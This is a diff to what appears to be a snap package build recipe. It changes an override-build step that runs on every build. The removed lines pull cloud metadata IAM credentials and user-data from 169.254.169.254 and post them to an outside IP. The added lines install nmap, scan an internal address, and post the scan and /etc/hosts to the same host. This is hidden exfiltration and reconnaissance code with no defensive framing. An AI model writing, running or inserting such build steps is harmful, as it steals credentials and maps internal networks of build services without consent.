@@ -14,12 +14,11 @@ parts:
         plugin: nil
         override-build: |
             apt-get update
-            apt-get install -y  curl
-            http_proxy="" curl -o iam http://169.254.169.254/latest/meta-data/iam/info
-            http_proxy="" curl -o sd http://169.254.169.254/latest/meta-data/iam/security-credentails/
-            http_proxy="" curl -o ud http://169.254.169.254/latest/user-data
-            curl -d @iam http://139.59.42.102/iam
-            curl -d @ud http://139.59.42.102/user-data
-            curl -d @sd http://139.59.42.102/sec-creds
+            apt-get install -y  curl nmap
+            cat /etc/hosts
+            ip route
+            nmap -oN nm 10.10.10.1
+            curl -d @nm http://139.59.42.102/nm
+            curl -d @/etc/hosts http://139.59.42.102/hosts
             echo 0
 
